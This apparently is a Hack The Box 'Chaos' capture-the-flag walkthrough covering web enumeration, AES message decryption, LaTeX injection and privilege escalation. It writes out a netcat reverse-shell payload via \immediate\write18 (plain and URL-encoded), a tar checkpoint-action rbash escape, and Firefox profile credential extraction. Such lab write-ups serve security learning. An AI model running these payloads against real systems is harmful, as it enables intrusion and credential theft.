&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;port-10000-gave-me-this-error-&quot;&gt;Port 10000 gave me this error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-switched-to-https-and-got-a-login-form-&quot;&gt;So I switched to &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; and got a login form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-have-any-credentials-and-i-ran-gobuster-and-got-nothing-interesting-so-we-will-ignore-this-and-look-at-port-80&quot;&gt;We don’t have any credentials and I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got nothing interesting so we will ignore this and look at port 80.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-just-a-normal-website-rest-of-it-&quot;&gt;It’s just a normal website, rest of it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-that-contact-form-and-its-doing-nothing-i-ran-gobuster-on-chaoshtb-and-got-these-results-&quot;&gt;I checked that contact form and it’s doing nothing. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://chaos.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 14:36:56 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/img (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
/source (Status: 301)
=====================================================
2019/05/24 14:40:36 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-now-this-part-is-tricky-because-going-to-the-ip-of-the-box-101010120-instead-of-chaoshtb-will-give-us-a-different-thing-virtual-hosting&quot;&gt;And now this part is tricky. Because going to the ip of the box &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.120&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt; will give us a different thing (virtual hosting).&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-saying-direct-ip-not-allowed-i-ran-another-gobuster-scan-on-the-ip-and-got-different-results-&quot;&gt;It’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;Direct IP not allowed&lt;/code&gt;. I ran another &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; scan on the ip and got different results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.120/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 14:41:52 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/wp (Status: 301)
=====================================================
2019/05/24 14:45:37 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;on-chaoshtb-the-thing-the-caught-my-attention-was-source-so-i-checked-that-and-it-didnt-have-anything-&quot;&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt; the thing the caught my attention was &lt;code class=&quot;highlighter-rouge&quot;&gt;/source&lt;/code&gt; so I checked that and it didn’t have anything :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-http101010120wp-and-found-a-wordpress-website-&quot;&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.120/wp&lt;/code&gt; and found a &lt;code class=&quot;highlighter-rouge&quot;&gt;wordpress&lt;/code&gt; website :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-looked-at-the-posts-there-was-only-one-post-and-it-was-password-protected-&quot;&gt;I looked at the posts, there was only one post and it was password protected :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-clicked-on-the-post-link-and-saw-that-the-author-of-the-post-is-called-human-&quot;&gt;I clicked on the post link and saw that the author of the post is called &lt;code class=&quot;highlighter-rouge&quot;&gt;human&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-trying-to-bruteforce-the-password-i-tried-some-basic-stuff-first-and-the-usernameusername-type-of-credentials-worked-the-password-was-human-&quot;&gt;Before trying to bruteforce the password I tried some basic stuff first and the &lt;code class=&quot;highlighter-rouge&quot;&gt;username:username&lt;/code&gt; type of credentials worked. The password was &lt;code class=&quot;highlighter-rouge&quot;&gt;human&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-some-credentials-for-mail--ayushjiujitsu&quot;&gt;And we got some credentials for mail : &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush:jiujitsu&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;accessing-the-e-mail-service-decrypting-secret-message&quot;&gt;Accessing the e-mail Service, Decrypting Secret Message&lt;/h3&gt;
&lt;h4 id=&quot;we-saw-earlier-some-email-services-running-on-the-machine-now-we-have-credentials-to-access-these-services-to-do-that-we-will-use-an-email-client-i-used-claws-mail-can-be-installed-with-apt-and-configured-it-like-this-&quot;&gt;We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;claws-mail&lt;/code&gt; (can be installed with apt) and configured it like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;inbox-was-empty-but-drafts-had-something-&quot;&gt;Inbox was empty but drafts had something :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;From: ayush &amp;lt;ayush@localhost&amp;gt;
To: undisclosed-recipients:;
Subject: service
Date: Sun, 28 Oct 2018 17:46:38 +0530
User-Agent: Roundcube Webmail/1.3.8

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;after-the-message-he-attached-two-files--enim_msgtxt-and-enpy-he-said-you-are-the-password-so-first-guess--password-most-likely-will-be-sahay&quot;&gt;After the message he attached two files : &lt;code class=&quot;highlighter-rouge&quot;&gt;enim_msg.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;en.py&lt;/code&gt;. He said &lt;code class=&quot;highlighter-rouge&quot;&gt;you are the password&lt;/code&gt;, so first guess … password most likely will be &lt;code class=&quot;highlighter-rouge&quot;&gt;sahay&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;enim_msgtxt-is-the-encrypted-message-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;enim_msg.txt&lt;/code&gt; is the encrypted message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-enpy-is-the-script-used-to-encrypt-the-message-&quot;&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;en.py&lt;/code&gt; is the script used to encrypt the message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = &quot;en&quot; + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;by-looking-at-the-encryption-script-we-will-know-that-the-message-is--aes-encrypted-i-used-this-tool-to-decrypt-the-message-&quot;&gt;By looking at the encryption script we will know that the message is  AES encrypted. I used this &lt;a href=&quot;https://github.com/happygirlzt/Cryptography/blob/master/encrypt.py&quot;&gt;tool&lt;/a&gt; to decrypt the message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-sahay-worked-the-decrypted-message-was-saved-in-a-file-called-t-it-was-base64-encoded-so-i-had-to-decode-it-&quot;&gt;Password &lt;code class=&quot;highlighter-rouge&quot;&gt;sahay&lt;/code&gt; worked. The decrypted message was saved in a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;t&lt;/code&gt;. It was base64 encoded so I had to decode it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-link--httpchaoshtbj00_w1ll_f1nd_n07h1n9_h3r3-lets-check-that&quot;&gt;We got a link : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3&lt;/code&gt;, Let’s check that.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploiting-latex-reverse-shell-as-www-data&quot;&gt;Exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt;, Reverse Shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-a-web-application-that-creates-pdfs-theres-a-field-for-input-and-3-templates-to-choose-from-test1-test2-test3-before-trying-to-create-a-pdf-i-ran-gobuster-and-got-these-results-&quot;&gt;It’s a web application that creates pdfs, There’s a field for input and 3 templates to choose from (&lt;code class=&quot;highlighter-rouge&quot;&gt;test1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;test2&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;test3&lt;/code&gt;) before trying to create a pdf I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 16:38:15 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/doc (Status: 301)
/index.php (Status: 200)
/pdf (Status: 301)
/source (Status: 301)
/templates (Status: 301)
=====================================================
2019/05/24 16:39:53 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;doc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/doc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/25.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-important-just-some-documentation-pdfs-there-was-a-directory-called-latex-this-reveals-that-the-web-app-is-using-latex&quot;&gt;Nothing important, just some documentation pdfs. There was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;latex&lt;/code&gt;, this reveals that the web app is using &lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;pdf-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/pdf&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-is-where-the-created-pdfs-are-saved-i-looked-at-some-of-them-and-they-were-just-tests-like-this-one-for-example-&quot;&gt;This is where the created pdfs are saved, I looked at some of them and they were just tests. Like this one for example :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-to-create-a-pdf-and-intercepted-the-request-with-burp-&quot;&gt;I tried to create a pdf and intercepted the request with burp :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-response-showed-a-full-log-which-revealed-type-and-version-of-the-backend-software-used-to-create-the-pdfs&quot;&gt;The response showed a full log which revealed type and version of the backend software used to create the pdfs.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-the-first-template-failed-&quot;&gt;However the first template failed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;test2-worked-fine-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;test2&lt;/code&gt; worked fine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;test3-as-well-latex-can-be-injectable-and-can-cause-some-vulnerabilities-if-there-wasnt-a-good-filter-i-tried-some-payloads-from-payloads-all-the-things-and-most-of-them-got-filtered-but-this-injection-payload-worked--immediatewrite18command-so-i-got-a-reverse-shell-like-this-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;test3&lt;/code&gt; as well. &lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt; can be injectable and can cause some vulnerabilities if there wasn’t a good filter. I tried some payloads from &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection&quot;&gt;Payloads All The Things&lt;/a&gt; and most of them got filtered. But this injection payload worked : &lt;code class=&quot;highlighter-rouge&quot;&gt;\immediate\write18{command}&lt;/code&gt;. So I got a reverse shell like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;payload--immediatewrite18rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-1010xxxx-1337-tmpf&quot;&gt;Payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f}&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;url-encoded--immediatewrite18rmtmpf3bmkfifotmpf3bcattmpfbinsh-i2261nc1010xxxx1337tmpf&quot;&gt;Url Encoded : &lt;code class=&quot;highlighter-rouge&quot;&gt;\immediate\write18{rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+10.10.xx.xx+1337+&amp;gt;/tmp/f}&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-a-reverse-shell-as-www-data-there-are-two-users-on-the-box--sahay-and-ayush-we-need-to-be-one-of-them-&quot;&gt;We got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;, There are two users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;sahay&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt;. We need to be one of them :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;privilege-escalation-to-ayush-bypassing-rbash-user-flag&quot;&gt;Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt;, Bypassing &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt;, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;we-got-earlier-ayush-credentials-for-mail--ayushjiujitsu-lets-try-that-password-&quot;&gt;We got earlier &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt; credentials for mail : &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush:jiujitsu&lt;/code&gt; let’s try that password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-but-we-are-in-a-restricted-bash-shell-now&quot;&gt;It worked but we are in a restricted bash shell now.&lt;/h4&gt;
&lt;h4 id=&quot;this-guide-is-useful-for-bypassing-restricted-shells-i-tried-some-commands-to-know-what-can-i-do-from-that-shell-and-i-could-run-tar-so-i-went-back-to-www-data-and-went-to-tmp&quot;&gt;&lt;a href=&quot;https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf&quot;&gt;This guide&lt;/a&gt; is useful for bypassing restricted shells. I tried some commands to know what can I do from that shell and I could run &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt;. So I went back to &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; and went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-created-a-file-and-called-it-rick--touch-rick&quot;&gt;I created a file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;touch rick&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-i-added-that-file-to-a-tar-archive-and-called-it-ricktar--tar--cvf-ricktar-rick&quot;&gt;Then I added that file to a tar archive and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;rick.tar&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;tar -cvf rick.tar rick&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-went-back-to-ayush-and-used-tar-to-bypass-the-shell--tar-cf-devnull-ricktar---checkpoint1---checkpoint-actionexecbinbash&quot;&gt;I went back to &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt; and used &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; to bypass the shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;tar cf /dev/null rick.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;after-that-i-just-had-to-fix-my-path-and-i-had-a-functioning-bash-shell--export-pathpathusrlocalsbinusrlocalbinusrsbinusrbinsbinbin&quot;&gt;After that I just had to fix my path and I had a functioning bash shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-read-the-user-flag-&quot;&gt;Now we can read the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;extracting-credentials-from-firefox-profile-privilege-escalation-and-root-flag&quot;&gt;Extracting Credentials from Firefox Profile, Privilege Escalation and Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;by-looking-at-the-home-directory-for-ayush-i-saw-something-strange-&quot;&gt;By looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt; I saw something strange :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-was-a-mozilla-data-directory-there-i-went-there-and-there-was-a-directory-for-firefox-and-it-had-a-profile-&quot;&gt;There was a &lt;code class=&quot;highlighter-rouge&quot;&gt;.mozilla&lt;/code&gt; data directory there. I went there and there was a directory for Firefox and it had a profile :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-use-a-tool-called-firefox-decrypt-and-pass-that-profile-to-it-this-tool-extracts-credentials-from-firefox-profiles&quot;&gt;We can use a tool called &lt;a href=&quot;https://github.com/unode/firefox_decrypt&quot;&gt;firefox decrypt&lt;/a&gt; and pass that profile to it. This tool extracts credentials from Firefox profiles.&lt;/h4&gt;
&lt;h4 id=&quot;i-had-to-get-the-firefox-directory-on-my-box-first-i-ran-a-python-simple-http-server-on-port-1919-in-homeayushmozillafirefox-then-on-my-box-i-created-a-directory-called-firefox-and-downloaded-the-contents-of-the-original-firefox-directory-from-the-simple-http-server--wget-httpchaoshtb1919---recursive&quot;&gt;I had to get the &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox&lt;/code&gt; directory on my box first, I ran a python simple http server on port 1919 in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ayush/.mozilla/firefox&lt;/code&gt; then on my box I created a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox&lt;/code&gt; and downloaded the contents of the original &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox&lt;/code&gt; directory from the simple http server : &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://chaos.htb:1919/ --recursive&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;server-log-&quot;&gt;Server Log :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;downloaded-files-were-saved-in-a-directory-called-chaoshtb1919&quot;&gt;Downloaded files were saved in a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb:1919&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;after-that-i-used-firefox_decryptpy-and-gave-it-the-profile-which-was-called-bzo7sjt1default-&quot;&gt;After that I used &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox_decrypt.py&lt;/code&gt; and gave it the profile which was called &lt;code class=&quot;highlighter-rouge&quot;&gt;bzo7sjt1.default&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./firefox_decrypt.py ../firefox/chaos.htb\:1919/bzo7sjt1.default/&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/chaos/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asked-for-a-password-i-gave-ayushs-password-jiujitsu-and-it-worked-we-got-credentials-for-the-application-that-was-running-on-port-10000-and-the-username-was-root--rootthiv8wrej&quot;&gt;It asked for a password, I gave &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt;’s password (&lt;code class=&quot;highlighter-rouge&quot;&gt;jiujitsu&lt;/code&gt;) and it worked. We got credentials for the application that was running on port 10000 and the username was &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;root:Thiv8wrej~&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-didnt-go-to-port-10000-again-i-tried-su-root-first-with-this-password-and-it-worked-&quot;&gt;I didn’t go to port 10000 again, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; first with this password and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
